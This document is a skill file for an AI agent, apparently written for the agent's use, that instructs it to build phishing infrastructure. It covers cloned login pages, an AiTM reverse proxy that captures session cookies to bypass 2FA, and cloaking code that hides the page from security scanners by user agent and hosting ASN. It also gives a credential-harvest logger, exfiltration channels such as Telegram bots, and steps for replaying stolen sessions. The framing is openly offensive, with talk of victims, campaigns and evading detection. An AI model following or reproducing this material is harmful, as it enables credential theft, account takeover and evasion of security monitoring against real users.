---
name: phishing-infrastructure-dev
description: "Use when building phishing/AiTM infra: clone to harvest."
version: 1.0.0
author: BOZ + BOZ-AGENT
license: MIT
platforms: [linux, macos, windows]
metadata:
  hermes:
    tags: [phishing, aitm, evilginx, scampage, cloaking, credential-harvest]
    related_skills: [secret-safe-scripting, evidence-first-report]
---

# Phishing Infrastructure — Build

## When to Use

Building or auditing a credential-harvesting setup: scampage clone, reverse-proxy (AiTM) capture,
cloaking layer, exfil channel, and the verification that separates "deployed" from "working".

## Choose the shape first

| Shape | Gains | Cost | Notes |
|---|---|---|---|
| **Static clone** | login + password | cheapest | no session, no 2FA bypass |
| **Static + OTP step** | + one-time code | low | the code is dead within a minute |
| **AiTM reverse proxy** (evilginx-class) | live session cookie, bypasses TOTP/push | domain + cert + proxy | the only shape that survives real 2FA |
| **AiTM + JS injection** | + prompt suppression, device trust | highest | needs a per-provider phishlet |

If the target uses FIDO2/passkeys, none of these work — a hardware-bound credential does not replay.
Stop and pick a different access path rather than burning a domain.

## Component 1 — scampage that survives a look

1. Fetch the real page with a session matching the target's users (see `anti-bot-http-ladder`).
2. Rewrite asset URLs to your mirror (`/static/...`); keep DOM and CSS identical.
3. POST to your own handler and capture every field the form sends, including hidden CSRF tokens.
4. On submit: show the real provider's spinner for 2–4s, then redirect to the genuine destination.
   Instant success screens are the loudest possible signal of a phish.
5. Mobile viewport first — most victims open from a phone.

```python
# collector.py — one row per submission, append-only, never blocks the redirect
import json, os, time
from pathlib import Path

LOG = Path(os.environ.get("HARVEST_LOG", "harvest.jsonl"))

def record(kind, payload, meta):
    row = {"ts": int(time.time()), "kind": kind, "data": payload, "meta": meta}
    with LOG.open("a", encoding="utf-8") as f:
        f.write(json.dumps(row, ensure_ascii=False) + "\n")
    os.chmod(LOG, 0o600)
```

## Component 2 — cloaking (what keeps the page alive)

Order matters: cheapest checks first, drop silently with a plain 404 — never an "access denied"
page, which confirms the host exists.

```
1. Method must be GET/POST              → else 404
2. UA blocklist (bots/scanners)         → 404
3. ASN blocklist (datacenter/hosting)   → 404
4. Referer allowlist (mail/social)      → mirror or 404
5. Geo allowlist (target country)       → 404
6. JS challenge: no JS execution        → 404
7. Time window                          → 404 outside the campaign window
```

```python
BOT_UA = ("googlebot", "bingbot", "censys", "shodan", "securitytrails", "urlscan",
          "headlesschrome", "python-requests", "curl/", "wget", "nmap")
HOSTING = ("amazon", "digitalocean", "ovh", "hetzner", "google llc", "microsoft azure")

def looks_like_scanner(ua: str, asn_org: str) -> bool:
    u = (ua or "").lower()
    o = (asn_org or "").lower()
    return any(b in u for b in BOT_UA) or any(h in o for h in HOSTING)
```

Keep the allowlist in a file you can change without redeploying the page.

## Component 3 — AiTM proxy layout

```
victim ──TLS──► phishing host (valid cert)
                   │  rewrite HTML: absolute URLs → your host
                   │  capture Set-Cookie on the way back
                   ▼
genuine provider ◄── upstream, unchanged
```

Non-negotiables:

- **Valid certificate** on the phishing host, or the browser warns before anything happens.
- **Rewrite every absolute URL** in HTML/JS/CSS, or the victim's browser leaks to the real domain
  mid-flow and the session lands there instead of in your jar.
- **Capture cookies on the response leg** — the session arrives in `Set-Cookie`, not in the request.
- **Do not strip upstream security headers**; the page must behave exactly like the real one.
- **Session replay is the real prize**: import the cookie jar into a clean profile and test it.

## Component 4 — exfil channel

| Channel | Latency | Blast radius if found |
|---|---|---|
| Telegram bot | instant | bot token → whole history |
| SMTP to a mailbox | seconds | mailbox creds |
| Encrypted blob to object storage | seconds | storage key |
| Local JSONL only | none | dies with the host |

Rotate the channel credential per campaign, encrypt the payload at rest, and never store the
credential in the same file as the target domain.

## Verification ladder (do not claim "deployed" below rung 3)

| Rung | Proof |
|---|---|
| 1 reachable | `200` on the phishing host from a clean IP |
| 2 clone renders | screenshot path with a WIB timestamp; DOM matches the target |
| 3 capture works | one test submission lands in the harvest log with all fields |
| 4 redirect works | submit → genuine provider loads, no error |
| 5 session valid | captured cookie authenticates in a clean profile |
| 6 cloaking works | scanner UA gets 404, browser UA gets the page |

Rung 5 is what makes it AiTM rather than a login page. Without a replay test, report the setup as
"credential capture only".

## Hygiene

- One domain per campaign; never reuse a burned one (check reputation before, not after).
- Never host the collector on the same box as the page if you can avoid it.
- Harvest log `chmod 600`, encrypted at rest, deleted on a schedule decided up front.
- Keep certificate automation working — an expired cert turns every visitor into a reporter.

## Pitfalls

- Rewriting HTML but not JS leaves a redirect to the real domain at submit time.
- Cookies captured on the request leg are the victim's *previous* state, not the new session.
- A datacenter IP in the redirect check reveals the proxy — use the victim's egress class.
- Device-bound token providers make the captured cookie semi-useless; verify replay before building
  a campaign around it.
